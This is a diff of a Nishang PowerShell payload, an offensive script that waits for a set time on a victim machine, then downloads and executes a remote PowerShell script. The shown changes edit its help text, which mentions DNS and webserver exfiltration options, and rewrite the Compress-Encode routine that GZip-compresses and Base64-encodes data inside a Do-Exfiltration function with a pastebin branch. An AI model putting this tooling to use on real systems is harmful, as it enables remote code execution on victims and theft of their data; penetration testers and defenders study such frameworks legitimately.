@@ -3,8 +3,9 @@
 Nishang Payload which waits till given time to execute a script.
 
 .DESCRIPTION
-This payload waits till the given time (on the victim)
-and then downloads a PowerShell script and executes it.
+This payload waits till the given time (on the victim) and then downloads a PowerShell script and executes it.
+If using DNS or Webserver ExfilOption, use Invoke-Decode.ps1 in the Utility folder to decode.
+
 
 .PARAMETER PayloadURL
 The URL from where the file would be downloaded.
@@ -184,16 +185,15 @@ function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,
 
     function Compress-Encode
     {
-        #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
-        $ms = New-Object IO.MemoryStream
-        $action = [IO.Compression.CompressionMode]::Compress
-        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
-        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
-        $pastevalue | ForEach-Object {$sw.WriteLine($_)}
-        $sw.Close()
-        # Base64 encode stream
-        $code = [Convert]::ToBase64String($ms.ToArray())
-        $code
+        #Compression logic from http://blog.karstein-consulting.com/2010/10/19/how-to-embedd-compressed-scripts-in-other-powershell-scripts/
+        $encdata = [string]::Join("`n", $pastevalue)
+        $ms = New-Object System.IO.MemoryStream
+        $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
+        $sw = New-Object System.IO.StreamWriter($cs)
+        $sw.Write($encdata)
+        $sw.Close();
+        $Compressed = [Convert]::ToBase64String($ms.ToArray())
+        $Compressed
     }
 
     if ($exfiloption -eq "pastebin")
